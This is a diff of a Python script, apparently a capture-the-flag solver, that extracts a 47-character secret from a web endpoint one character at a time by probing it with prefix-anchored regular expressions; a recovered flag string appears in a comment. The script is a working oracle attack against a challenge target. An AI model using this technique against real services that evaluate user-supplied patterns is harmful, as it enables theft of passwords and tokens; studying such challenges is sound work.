@@ -23,43 +23,49 @@ def checkRegex(regex):
 URL = 'https://learn-gcp-286602.uc.r.appspot.com/'
 
 passwordList = []
-for position in range(47):
+#passwordList = ['Y', '0', 'U']
+#passwordList = ['Y', '0', 'U', '_', 'S', 'h', '0', 'u', 'l', 'd', '_', 'V', '0', 't', 'e', '_', 'b', 'u', 't', '_', 'P', 'l', '3', 'a', 's', 'E', '_', 'D', 'o', 'n', 't', '-', 'V', '0', 'T', 'E', '_', 'T', 'R', 'U', 'M', 'P', '!', '!', '-', '_', '-']
+
+for position in range(len(passwordList), 47):
 	possibleCharacters = ['[a-z]', '[A-Z]', '[0-9]', '_', '-', '!']
 	password = ''.join(passwordList)
 	for charType in possibleCharacters:
-		#regexInput = r'^{}\{\}[a-zA-Z0-9_!-]{47}$'.format(''.join(password))
 		regexInput = '^{}{}'.format(password, charType)
-		#print('Checking charType {} for pos {} : {}'.format(charType, position, regexInput))
 		if checkRegex(regexInput):
-			print('{} : {}'.format(position, charType))
+			print('{}. Char type = {} -> '.format(position, charType), end='')
 			correctCharType = charType
 			break
-	#print('Found correct char type')
+	
 	if correctCharType == '[a-z]':
 		for c in ascii_lowercase:
 			regexInput = '^{}{}'.format(password, c)
 			if checkRegex(regexInput):
-				print('correct = {} : {}'.format(position, c))
+				#print('correct = {} : {}'.format(position, c))
+				print('char = {}'.format(c))
 				passwordList.append(c)
 				break
 	elif correctCharType == '[A-Z]':
 		for c in ascii_uppercase:
 			regexInput = '^{}{}'.format(password, c)
 			if checkRegex(regexInput):
-				print('correct = {} : {}'.format(position, c))
+				#print('correct = {} : {}'.format(position, c))
+				print('char = {}'.format(c))
 				passwordList.append(c)
 				break
 	elif correctCharType == '[0-9]':
 		for c in range(10):
 			regexInput = '^{}{}'.format(password, c)
 			if checkRegex(regexInput):
-				print('correct = {} : {}'.format(position, c))
+				#print('correct = {} : {}'.format(position, c))
+				print('char = {}'.format(c))
 				passwordList.append(str(c))
 				break
 	else:
 		c = correctCharType
-		print('{} : {}'.format(position, c))
+		#print('{} : {}'.format(position, c))
+		#print('correct = {} : {}'.format(position, c))
+		print('char = {}'.format(c))
 		passwordList.append(c)
 
-password = str(passwordList)
+password = ''.join(passwordList)
 print(password)
